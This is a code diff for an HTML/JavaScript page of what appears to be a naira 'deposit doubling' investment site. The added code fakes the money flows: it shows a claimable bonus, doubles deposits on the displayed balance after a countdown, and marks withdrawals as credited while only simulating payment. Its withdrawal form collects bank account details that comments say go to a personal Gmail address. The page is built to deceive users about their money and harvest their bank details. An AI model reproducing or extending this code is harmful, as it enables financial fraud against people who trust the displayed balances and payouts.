+            // Store claim time
+            lastBonusClaim = new Date().getTime();
+            localStorage.setItem('lastBonusClaim', lastBonusClaim);
+            
+            // Update button state
+            updateBonusButton();
+            
+            // Animation
+            this.classList.add('bounce');
+            setTimeout(() => this.classList.remove('bounce'), 500);
+            
+            // Show notification
+            showNotification('₦200 bonus claimed!', 'success');
+        });
+        
+        // Add transaction to list
+        function addTransaction(title, amount, status) {
+            const transactionsList = document.getElementById('transactionsList');
+            const noTransactions = document.getElementById('noTransactions');
+            
+            if (noTransactions) noTransactions.remove();
+            
+            const statusClasses = {
+                'pending': 'text-yellow-500',
+                'success': 'text-green-500',
+                'failed': 'text-red-500'
+            };
+            
+            const statusIcons = {
+                'pending': 'fa-clock',
+                'success': 'fa-check-circle',
+                'failed': 'fa-times-circle'
+            };
+            
+            const transaction = document.createElement('div');
+            transaction.className = 'transaction-item bg-gray-50 p-4 rounded-lg flex justify-between items-center';
+            transaction.innerHTML = `
+                <div class="flex items-center">
+                    <i class="fas ${statusIcons[status]} ${statusClasses[status]} text-xl mr-3"></i>
+                    <div>
+                        <p class="font-medium">${title}</p>
+                        <p class="text-sm text-gray-500">${new Date().toLocaleString()}</p>
                     </div>
-                    <p class="font-medium text-gray-700 truncate">${fileName}</p>
-                `;
-                uploadArea.classList.add('bg-green-50');
-                uploadArea.classList.remove('bg-white');
-            }
+                </div>
+                <p class="font-bold ${statusClasses[status]}">${amount}</p>
+            `;
+            
+            transactionsList.prepend(transaction);
+        }
+        
+        // Show notification
+        function showNotification(message, type) {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-5 right-5 z-50 p-4 rounded-lg shadow-lg text-white ${type === 'success' ? 'bg-green-500' : 'bg-red-500'} animate-bounce`;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.classList.add('opacity-0', 'transition-opacity', 'duration-500');
+                setTimeout(() => notification.remove(), 500);
+            }, 3000);
+        }
+
+        // Withdraw form submission
+        document.getElementById('withdrawForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const bankName = document.getElementById('bank-name').value;
+            const accountNumber = document.getElementById('account-number').value;
+            const accountName = document.getElementById('account-name').value;
+            const amount = document.getElementById('withdraw-amount').value;
+            
+            // Add transaction
+            addTransaction('Withdrawal Request', `₦${amount}`, 'pending');
+            
+            // Show status
+            const statusDiv = document.getElementById('withdraw-status');
+            statusDiv.classList.remove('hidden');
+            statusDiv.innerHTML = `
+                <div class="bg-green-100 border-l-4 border-green-600 p-4">
+                    <p class="text-green-800">Withdrawal request for  ₦${amount} has been submitted successfully!</p>
+                    <p class="text-green-800 mt-2">Your request is pending and will be processed shortly.</p>
+                </div>
+            `;
+            
+            // Send email (simulated)
+            const emailBody = `Withdrawal Request Details:
+            Bank Name: ${bankName}
+            Account Number: ${accountNumber}
+            Account Name: ${accountName}
+            Amount: ₦${amount}`;
+            
+            console.log(`Email sent to ibrahimuthman713@gmail.com with content:\n${emailBody}`);
+            
+            // Reset form
+            this.reset();
+            
+            // Process withdrawal after 15 minutes
+            setTimeout(() => {
+                // Update transaction status
+                const transactions = document.querySelectorAll('.transaction-item');
+                if (transactions.length > 0) {
+                    const latestTransaction = transactions[0];
+                    latestTransaction.querySelector('i').className = 'fas fa-check-circle text-green-500 text-xl mr-3';
+                    latestTransaction.querySelector('p.font-bold').className = 'font-bold text-green-500';
+                    
+                    // Show notification
+                    showNotification(`₦${amount} has been credited to your account!`, 'success');
+                    
+                    // Animation
+                    latestTransaction.classList.add('pulse');
+                    setTimeout(() => latestTransaction.classList.remove('pulse'), 1500);
+                }
+            }, 15 * 60 * 1000); // 15 minutes
+            
+            // In a real implementation, you would send this data to ibrahimuthman713@gmail.com
+            // via your backend server using something like:
+            // fetch('/api/withdraw', {
+            //     method: 'POST',
+            //     body: JSON.stringify({bankName, accountNumber, accountName, amount}),
+            //     headers: {'Content-Type': 'application/json'}
+            // })
         });
 
-        // Update return amount when deposit amount changes
-        document.getElementById('amount').addEventListener('input', function(e) {
-            const amount = parseFloat(e.target.value) || 0;
-            const returnAmount = amount * 2;
-            document.querySelector('.bg-blue-50 p-2xl').textContent = `₦${returnAmount.toLocaleString()}`;
+        // Mobile menu toggle
+        document.getElementById('mobile-menu-button').addEventListener('click', function() {
+            const menu = document.getElementById('mobile-menu');
+            menu.classList.toggle('hidden');
+        });
+
+        // FAQ accordion
+        document.querySelectorAll('.faq-question').forEach(button => {
+            button.addEventListener('click', () => {
+                const answer = button.nextElementSibling;
+                const icon = button.querySelector('i');
+                
+                // Toggle answer visibility
+                answer.classList.toggle('hidden');
+                
+                // Rotate icon
+                icon.classList.toggle('transform');
+                icon.classList.toggle('rotate-180');
+            });
+        });
+
+        // Deposit countdown
+        document.getElementById('depositBtn').addEventListener('click', function() {
+            this.disabled = true;
+            const countdownDiv = document.getElementById('countdown');
+            countdownDiv.classList.remove('hidden');
+            
+            let seconds = 180; // 3 minutes
+            const countdownInterval = setInterval(() => {
+                const minutes = Math.floor(seconds / 60);
+                const remainingSeconds = seconds % 60;
+                countdownDiv.textContent = `Processing... ${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownDiv.textContent = 'Processing complete! Funds will reflect in 15 minutes';
+                    
+                    // Simulate balance update after 15 minutes
+                    setTimeout(() => {
+                        const amount = parseInt(document.getElementById('amount').value);
+                        if (!isNaN(amount) && amount >= 1000) {
+                            const balanceElement = document.querySelector('#dashboard .bg-white:nth-child(1) p');
+                            let currentBalance = parseInt(balanceElement.textContent.replace('₦', ''));
+                            currentBalance += amount * 2;
+                            balanceElement.textContent = `₦${currentBalance}`;
+                            countdownDiv.innerHTML = '<div class="bg-green-100 border-l-4 border-green-600 p-4 text-green-800">Your deposit has been processed and doubled!</div>';
+                        }
+                    }, 900000); // 15 minutes in milliseconds
+                }
+                seconds--;
+            }, 1000);
+        });
+
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                
+                if (targetElement) {
+                    targetElement.scrollIntoView({
+                        behavior: 'smooth'
+                    });
+                    
+                    // Close mobile menu if open
+                    const mobileMenu = document.getElementById('mobile-menu');
+                    if (!mobileMenu.classList.contains('hidden')) {
+                        mobileMenu.classList.add('hidden');
+                    }
+                }
+            });
         });
     </script>
 </body>
